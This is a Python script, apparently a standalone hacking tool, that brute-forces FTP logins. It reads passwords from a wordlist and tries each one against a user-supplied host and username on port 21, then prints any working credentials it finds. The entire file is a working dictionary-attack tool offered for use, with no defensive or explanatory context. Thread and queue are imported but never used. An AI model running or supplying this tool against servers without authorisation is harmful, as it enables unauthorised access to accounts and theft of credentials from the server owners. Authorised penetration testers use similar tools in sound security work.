import ftplib
from colorama import Fore, init 
from os import path
from tqdm import tqdm
import socket
from threading import Thread
import queue

while(1):
    wordlist = input("wordlist file : ")
    if (path.exists(wordlist) ) :
        break
    print("[-] File does not exist")
port = 21
n_threads = 30
while(1):
    host = input("Host : ")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    result = sock.connect_ex((host, port))
    if result == 0:
       print ("[+] Server is up")
       break
    else:
       print ("[-] Server is unreachable")

user = input("User : ")

n_words = len(list(open(wordlist, "rb")))
print("Total passwords to test:", n_words)
with open(wordlist, "rb") as wordlist:
    for word in tqdm(wordlist, total=n_words, unit="word"):
        print("[!] Trying : " +word.decode('utf-8').strip("\n"))
        try:
            server = ftplib.FTP()

            server.connect(host, port)
            server.login(user, word.decode('utf-8').strip("\n"))

        except ftplib.error_perm :
            pass
        else:
            print(f"{Fore.GREEN}[+] Found credentials: ")
            print(f"\tHost: {host}")
            print(f"\tUser: {user}")
            print(f"\tPassword: {word.decode('utf-8')}{Fore.RESET}")
            exit(0)
print("[!] Password not found, try other wordlist.")